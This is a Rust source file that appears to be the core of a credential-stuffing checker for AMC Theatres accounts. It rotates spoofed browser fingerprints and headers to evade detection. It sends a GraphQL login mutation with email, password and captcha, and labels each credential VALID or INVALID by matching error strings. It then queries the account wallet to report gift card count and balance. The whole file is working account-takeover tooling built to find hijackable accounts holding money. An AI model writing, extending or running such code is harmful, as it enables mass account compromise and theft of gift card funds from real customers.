use rand::seq::IndexedRandom;
use wreq::header::HeaderMap;
use wreq_util::Emulation;

#[derive(Debug, Clone, Copy)]
pub enum BrowserType {
    Chrome,
    Firefox,
    SafariIos,
}

#[derive(Debug, Clone)]
pub struct ProfileConfig {
    pub emulation: Emulation,
    pub user_agent: &'static str,
    pub sec_ch_ua: &'static str,
    pub browser: BrowserType,
}

static ALL_PROFILE_CONFIGS: &[ProfileConfig] = &[
    // Chrome
    ProfileConfig { emulation: Emulation::Chrome116, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", sec_ch_ua: r#""Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116""#, browser: BrowserType::Chrome },
    ProfileConfig { emulation: Emulation::Chrome120, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", sec_ch_ua: r#""Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120""#, browser: BrowserType::Chrome },
    ProfileConfig { emulation: Emulation::Chrome124, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", sec_ch_ua: r#""Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99""#, browser: BrowserType::Chrome },
    ProfileConfig { emulation: Emulation::Chrome130, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36", sec_ch_ua: r#""Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99""#, browser: BrowserType::Chrome },
    ProfileConfig { emulation: Emulation::Chrome131, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", sec_ch_ua: r#""Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24""#, browser: BrowserType::Chrome },
    ProfileConfig { emulation: Emulation::Chrome131, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", sec_ch_ua: r#""Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24""#, browser: BrowserType::Chrome },
    ProfileConfig { emulation: Emulation::Chrome133, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36", sec_ch_ua: r#""Google Chrome";v="133", "Chromium";v="133", "Not-A.Brand";v="24""#, browser: BrowserType::Chrome },
    ProfileConfig { emulation: Emulation::Chrome133, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36", sec_ch_ua: r#""Google Chrome";v="133", "Chromium";v="133", "Not-A.Brand";v="24""#, browser: BrowserType::Chrome },
    ProfileConfig { emulation: Emulation::Chrome137, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36", sec_ch_ua: r#""Google Chrome";v="144", "Chromium";v="144", "Not-A.Brand";v="99""#, browser: BrowserType::Chrome },
    ProfileConfig { emulation: Emulation::Chrome137, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36", sec_ch_ua: r#""Google Chrome";v="144", "Chromium";v="144", "Not-A.Brand";v="99""#, browser: BrowserType::Chrome },
    ProfileConfig { emulation: Emulation::Chrome137, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", sec_ch_ua: r#""Google Chrome";v="146", "Chromium";v="146", "Not-A.Brand";v="99""#, browser: BrowserType::Chrome },
    ProfileConfig { emulation: Emulation::Chrome137, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", sec_ch_ua: r#""Google Chrome";v="146", "Chromium";v="146", "Not-A.Brand";v="99""#, browser: BrowserType::Chrome },

    // Firefox
    ProfileConfig { emulation: Emulation::Firefox109, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0", sec_ch_ua: "", browser: BrowserType::Firefox },
    ProfileConfig { emulation: Emulation::Firefox117, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0", sec_ch_ua: "", browser: BrowserType::Firefox },
    ProfileConfig { emulation: Emulation::Firefox133, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0", sec_ch_ua: "", browser: BrowserType::Firefox },
    ProfileConfig { emulation: Emulation::Firefox133, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0", sec_ch_ua: "", browser: BrowserType::Firefox },
    ProfileConfig { emulation: Emulation::Firefox135, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0", sec_ch_ua: "", browser: BrowserType::Firefox },
    ProfileConfig { emulation: Emulation::Firefox139, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0", sec_ch_ua: "", browser: BrowserType::Firefox },
    ProfileConfig { emulation: Emulation::Firefox139, user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0", sec_ch_ua: "", browser: BrowserType::Firefox },

    // Safari iOS
    ProfileConfig { emulation: Emulation::SafariIos18_1_1, user_agent: "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1", sec_ch_ua: "", browser: BrowserType::SafariIos },
    ProfileConfig { emulation: Emulation::SafariIos18_1_1, user_agent: "Mozilla/5.0 (iPhone; CPU iPhone OS 26_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1", sec_ch_ua: "", browser: BrowserType::SafariIos },
];

static ACCEPT_LANGUAGES: &[&str] = &[
    "en-US,en;q=0.9",
    "en-US,en;q=0.5",
    "en-GB,en;q=0.9",
    "en-GB,en-US;q=0.9,en;q=0.8",
    "en-US,en;q=0.9,es;q=0.8",
    "en-US,en;q=0.9,fr;q=0.8",
    "en-US,en;q=0.9,de;q=0.8",
    "en,en-US;q=0.9",
    "en-US",
    "en-US,en;q=0.8",
    "en-GB,en;q=0.7",
    "en-US,en;q=0.9,ja;q=0.8",
    "en-US,en;q=0.9,pt;q=0.8",
    "en-US,en;q=0.9,it;q=0.8",
    "en-US,en;q=0.9,ko;q=0.8",
    "en-US,en;q=0.9,zh-CN;q=0.8",
];

pub fn random_profile_config() -> ProfileConfig {
    let mut rng = rand::rng();
    ALL_PROFILE_CONFIGS.choose(&mut rng).unwrap().clone()
}

fn random_accept_language() -> &'static str {
    let mut rng = rand::rng();
    ACCEPT_LANGUAGES.choose(&mut rng).unwrap()
}

pub fn build_headers(cfg: &ProfileConfig) -> HeaderMap {
    let mut headers = HeaderMap::new();

    headers.insert("user-agent", cfg.user_agent.parse().unwrap());

    match cfg.browser {
        BrowserType::Chrome => {
            headers.insert("accept", "*/*".parse().unwrap());
            headers.insert("accept-language", random_accept_language().parse().unwrap());
            headers.insert("content-type", "application/json".parse().unwrap());
            headers.insert("origin", "https://www.amctheatres.com".parse().unwrap());
            headers.insert("referer", "https://www.amctheatres.com/".parse().unwrap());
            headers.insert("sec-ch-ua", cfg.sec_ch_ua.parse().unwrap());
            headers.insert("sec-ch-ua-mobile", "?0".parse().unwrap());
            headers.insert("sec-ch-ua-platform", r#""Windows""#.parse().unwrap());
            headers.insert("sec-fetch-dest", "empty".parse().unwrap());
            headers.insert("sec-fetch-mode", "cors".parse().unwrap());
            headers.insert("sec-fetch-site", "same-site".parse().unwrap());
            headers.insert("priority", "u=1, i".parse().unwrap());
        }
        BrowserType::Firefox => {
            headers.insert("accept", "*/*".parse().unwrap());
            headers.insert("accept-language", random_accept_language().parse().unwrap());
            headers.insert("accept-encoding", "gzip, deflate, br".parse().unwrap());
            headers.insert("content-type", "application/json".parse().unwrap());
            headers.insert("origin", "https://www.amctheatres.com".parse().unwrap());
            headers.insert("referer", "https://www.amctheatres.com/".parse().unwrap());
            headers.insert("sec-fetch-dest", "empty".parse().unwrap());
            headers.insert("sec-fetch-mode", "cors".parse().unwrap());
            headers.insert("sec-fetch-site", "same-site".parse().unwrap());
            headers.insert("te", "trailers".parse().unwrap());
        }
        BrowserType::SafariIos => {
            headers.insert("accept", "*/*".parse().unwrap());
            headers.insert("accept-language", random_accept_language().parse().unwrap());
            headers.insert("content-type", "application/json".parse().unwrap());
            headers.insert("origin", "https://www.amctheatres.com".parse().unwrap());
            headers.insert("referer", "https://www.amctheatres.com/".parse().unwrap());
            headers.insert("sec-fetch-dest", "empty".parse().unwrap());
            headers.insert("sec-fetch-mode", "cors".parse().unwrap());
            headers.insert("sec-fetch-site", "same-site".parse().unwrap());
            headers.insert("priority", "u=1, i".parse().unwrap());
        }
    }

    headers
}

pub fn check_login_status(body: &str) -> &'static str {
    let lower = body.to_lowercase();

    let fail_keys = [
        "the information you entered doesn't match what we have on file",
        "password change required",
        "loyalty account is in an expired state",
        "login requires either an",
        "doesn't meet the formatting requirements.",
        "your authentication could not be validated",
    ];

    for key in &fail_keys {
        if lower.contains(key) {
            return "INVALID";
        }
    }

    if lower.contains("accountid") {
        return "VALID";
    }

    "UNKNOWN"
}

pub const LOGIN_QUERY: &str = r#"
mutation Login($email: String!, $password: String!, $captcha: String!, $orderToken: String) {
  userLogin(input: {email: $email, password: $password, captcha: $captcha, captchaType: WEB, orderToken: $orderToken}) {
    user { ...GtmUser }
  }
}
fragment GtmUser on User {
  account {
    accountId emailAddress mobilePhoneNumber accountType
    isAlist: hasProductSubscription(subscriptionType: A_LIST)
    alist: productSubscription(subscriptionType: A_LIST) { typeCode }
    isShareholder onePassCount firstName lastName address1 address2 city state postalCode
  }
  sessionId
}"#;

pub const WALLET_QUERY: &str = r#"
query wallet {
  __typename
  viewer {
    __typename
    user {
      __typename
      id
      account {
        __typename
        id
        wallet {
          __typename
          ...wallet
        }
      }
    }
  }
}
fragment wallet on Wallet {
  __typename
  id
  creditCards {
    __typename
    ...creditCard
  }
  giftCards {
    __typename
    ...giftCard
  }
  giftCardSummary {
    __typename
    id
    balance
  }
  disneyRewardsCards {
    __typename
    ...disneyRewardsCard
  }
}
fragment creditCard on CreditCard {
  __typename
  id
  cardType
  lastFour
  expirationDate
  default
  merchantToken
  address1
  address2
  city
  state
  postalCode
  verified
}
fragment giftCard on GiftCard {
  __typename
  id
  lastFour
  token
}
fragment disneyRewardsCard on DisneyRewardsCard {
  __typename
  id
  lastFour
  merchantToken
}"#;

#[derive(Debug, serde::Deserialize)]
pub struct WalletResponse {
    pub data: Option<WalletData>,
}

#[derive(Debug, serde::Deserialize)]
pub struct WalletData {
    pub viewer: Option<WalletViewer>,
}

#[derive(Debug, serde::Deserialize)]
pub struct WalletViewer {
    pub user: Option<WalletUser>,
}

#[derive(Debug, serde::Deserialize)]
pub struct WalletUser {
    pub account: Option<WalletAccount>,
}

#[derive(Debug, serde::Deserialize)]
pub struct WalletAccount {
    pub wallet: Option<Wallet>,
}

#[derive(Debug, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
#[allow(dead_code)]
pub struct Wallet {
    #[serde(default)]
    pub gift_cards: Vec<GiftCard>,
    pub gift_card_summary: Option<GiftCardSummary>,
    #[serde(default)]
    pub credit_cards: Vec<CreditCard>,
}

#[derive(Debug, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
#[allow(dead_code)]
pub struct GiftCard {
    pub last_four: Option<String>,
    pub token: Option<String>,
}

#[derive(Debug, serde::Deserialize)]
pub struct GiftCardSummary {
    pub balance: Option<serde_json::Value>,
}

#[derive(Debug, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
#[allow(dead_code)]
pub struct CreditCard {
    pub card_type: Option<String>,
    pub last_four: Option<String>,
}

pub fn check_gift_cards(resp: &WalletResponse) -> (f64, bool, &'static str) {
    let wallet = match resp
        .data
        .as_ref()
        .and_then(|d| d.viewer.as_ref())
        .and_then(|v| v.user.as_ref())
        .and_then(|u| u.account.as_ref())
        .and_then(|a| a.wallet.as_ref())
    {
        Some(w) => w,
        None => return (0.0, false, "NONE"),
    };

    let gift_card_status = match wallet.gift_cards.len() {
        0 => "NONE",
        1 => "SINGLE",
        _ => "MORE",
    };

    if wallet.gift_cards.is_empty() {
        return (0.0, false, gift_card_status);
    }

    let balance = wallet
        .gift_card_summary
        .as_ref()
        .and_then(|s| s.balance.as_ref())
        .and_then(|b| match b {
            serde_json::Value::Number(n) => n.as_f64(),
            serde_json::Value::String(s) => s.parse::<f64>().ok(),
            _ => None,
        })
        .unwrap_or(0.0);

    if balance <= 0.0 {
        return (0.0, false, gift_card_status);
    }

    (balance, true, gift_card_status)
}

pub fn browser_name(browser: BrowserType) -> &'static str {
    match browser {
        BrowserType::Chrome => "chrome",
        BrowserType::Firefox => "firefox",
        BrowserType::SafariIos => "safari-ios",
    }
}
